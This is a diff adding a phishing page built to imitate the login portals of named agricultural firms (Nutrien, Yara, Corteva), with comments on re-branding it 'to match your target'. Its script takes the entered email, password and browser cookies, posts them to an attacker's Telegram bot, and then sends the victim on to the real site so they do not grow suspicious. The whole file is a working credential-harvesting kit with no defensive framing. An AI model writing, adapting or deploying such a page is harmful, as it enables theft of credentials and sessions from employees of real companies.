@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Login</title>
+    <!-- Use inline CSS to mimic Nutrien/Yara/Corteva -->
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 350px; }
+        .logo { text-align: center; margin-bottom: 20px; font-weight: bold; color: #005a9e; font-size: 24px; } /* Change color to match your target */
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #005a9e; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        button:hover { background: #004a85; }
+        .error { color: red; font-size: 12px; display: none; margin-top: 10px; }
+        .loading { display: none; text-align: center; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <div class="logo">AGRI PORTAL</div> <!-- Change to "NUTRIEN" or "YARA" -->
+    <form id="loginForm">
+        <input type="email" id="email" name="email" placeholder="Work Email" required>
+        <input type="password" id="password" name="password" placeholder="Password" required>
+        <button type="submit" id="submitBtn">Sign In</button>
+        <div class="loading" id="loading">Authenticating...</div>
+        <div class="error" id="error">Invalid credentials. Please try again.</div>
+    </form>
+</div>
+
+<script>
+    // CONFIGURATION
+    const TELEGRAM_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+    const TARGET_SITE = 'https://portal.nutrien.com'; // Redirect here after harvest
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const btn = document.getElementById('submitBtn');
+        const loading = document.getElementById('loading');
+        const error = document.getElementById('error');
+
+        btn.style.display = 'none';
+        loading.style.display = 'block';
+
+        // 1. Capture the Session Cookie (Crucial)
+        // We grab the cookie *after* the browser processes the login request, 
+        // but since we are intercepting, we grab the current cookie jar.
+        // Note: If the target site sets "HttpOnly" cookies, you can't read them via JS 
+        // unless you are on the same domain or use a proxy. 
+        // However, for harvesting *into* a Telegram group, we send what we have.
+        const sessionCookie = document.cookie; 
+
+        // 2. Send Data to Telegram
+        const message = `
+🔓 <b>New Login Attempt</b>
+📧 Email: <code>${email}</code>
+🔑 Password: <code>${password}</code>
+🍪 Cookie: <code>${sessionCookie}</code>
+🌐 IP: ${getIP()}
+        `;
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        }).then(() => {
+            // 3. Success State
+            loading.innerText = "Login Successful! Redirecting...";
+            setTimeout(() => {
+                window.location.href = TARGET_SITE;
+            }, 2000);
+        }).catch(err => {
+            console.error('Exfil failed', err);
+            // Fallback: Still redirect them so they don't get suspicious
+            window.location.href = TARGET_SITE;
+        });
+    });
+
+    // Helper to get IP (Cloudflare passes it, or use a free API)
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch {
+            return 'Unknown';
+        }
+    }
+</script>
+
+</body>
+</html>
